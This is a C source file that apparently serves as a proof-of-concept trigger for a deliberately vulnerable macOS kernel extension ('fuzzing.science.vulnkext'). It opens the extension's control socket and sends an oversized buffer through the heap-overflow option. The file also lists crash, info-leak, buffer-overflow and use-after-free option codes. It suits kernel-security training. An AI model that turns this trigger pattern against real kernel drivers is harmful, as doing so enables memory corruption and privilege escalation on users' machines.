#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "kern_control.h"

// Vulnerabilities
#define CRASH             0x1  //  Calls 0x51515151 and crashes
#define HEAP_OVERFLOW     0x2  //  heap overflow
#define INFO_LEAK         0x3
#define BUFFER_OVERFLOW   0x4
#define USE_AFTER_FREE    0x5

#define	CONTROL_NAME "fuzzing.science.vulnkext"

#define SYSPROTO_CONTROL        2
#define AF_SYS_CONTROL          2 

u_int32_t getctlidbybame(int sock, char *name)
{
	struct ctl_info info;
	memset(&info, 0, sizeof(info));
	strncpy(info.ctl_name, CONTROL_NAME, sizeof(info.ctl_name));

	int err = ioctl(sock, CTLIOCGINFO, &info);

	if (err)
	{
		perror("Could not get ID for kernel control.\n");
		exit(-1);
	}

	return info.ctl_id;
}

int socket_ctl(char *name)
{
	int sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);

	if (sock < 0)
	{
		perror("failed to open socket\n");
		return 0;
	}
	
	u_int32_t ctl_id = getctlidbybame(sock, name);

	if( ctl_id == 0 )
		return 0;

	struct sockaddr_ctl addr;
	
	addr.sc_len 	= sizeof(addr);
	addr.sc_family  = AF_SYSTEM;
	addr.ss_sysaddr = AF_SYS_CONTROL;
	addr.sc_id 		= ctl_id;
	addr.sc_unit 	= 0; /* allocate dynamically */

	int err = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
	
	if (err)
        fprintf(stderr, "failed to open socket\n");

	return sock;
}

int main(int argc, char* argv[ ])
{
    int ctrl = socket_ctl(CONTROL_NAME);

	if (ctrl == 0)
	{
		printf("Failed to find %s\n", CONTROL_NAME);
		return 1;
	}

	printf("got ctrl: %d\n", ctrl);

	size_t size = 1024;
	char address[size];
	
	memset(address, 0x42, size);
	
    if ( setsockopt(ctrl, SYSPROTO_CONTROL, HEAP_OVERFLOW, address, size) )
    {
		perror("Failed to getsockopt");
		close(ctrl);
        printf("error\n");
        return 1;
    }

	close(ctrl);
    return 0;
}
